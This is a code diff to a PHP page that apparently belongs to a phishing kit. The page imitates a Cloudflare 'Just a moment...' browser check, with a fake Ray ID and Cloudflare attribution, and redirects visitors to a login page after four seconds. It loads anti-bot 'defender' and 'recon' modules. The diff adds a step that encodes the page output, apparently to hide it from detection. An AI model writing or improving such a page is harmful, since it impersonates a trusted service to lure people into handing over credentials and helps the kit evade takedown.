@@ -8,19 +8,19 @@ require 'KU5H/defender6.php';
 require 'KU5H/defender7.php';
 require 'KU5H/defender8.php';
 require 'KU5H/recon.php';
+require_once __DIR__ . '/H4Z3/functions.php';
 
-    session_start();
-    include './settings.php';
-    $token  =   md5(uniqid(microtime(), true));
+session_start();
+include './settings.php';
+$token = md5(uniqid(microtime(), true));
 
-    if ($CFProtection == "off") {
-        
-        die('<script> window.location.href = \'./login.php\'; </script>');
-    }
+if ($CFProtection == "off") {
+    die('<script> window.location.href = \'./login.php\'; </script>');
+}
 
-else{
-
-echo('<!DOCTYPE html>
+ob_start();
+?>
+<!DOCTYPE html>
 <html lang="en">
     <head>
         <meta charset="UTF-8">
@@ -29,7 +29,7 @@ echo('<!DOCTYPE html>
         <title>Just a moment...</title>
         <link rel="shortcut icon" href="./V1P3R/img/favicon.png" type="image/x-icon">
         <link rel="stylesheet" href="./V1P3R/css/cf.css">
-        <script>setTimeout(function(){ window.location.href = \'./login.php\';}, 4000);</script>
+        <script>setTimeout(function(){ window.location.href = './login.php';}, 4000);</script>
     </head>
     <body>
         <table width="100%" height="100%" cellpadding="20">
@@ -39,9 +39,9 @@ echo('<!DOCTYPE html>
                         <div class="cf-browser-verification cf-im-under-attack">
                             <noscript>
                                 <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
-                                
+
                                 <style>
-                                
+
                                 #cf-content {
                                     display: none !important;
                                 }
@@ -69,14 +69,17 @@ echo('<!DOCTYPE html>
                         <div class="attribution">
                             DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
                             <br>
-                            <span class="ray_id">Ray ID: <code><?php echo uniqid();  ?></code></span>
+                            <span class="ray_id">Ray ID: <code><?php echo uniqid(); ?></code></span>
                         </div>
                     </td>
                 </tr>
             </tbody>
         </table>
     </body>
-    
-</html>');
-                            };
+
+</html>
+<?php
+$html = ob_get_clean();
+h4z3_render_encoded_page($html);
 ?>
+
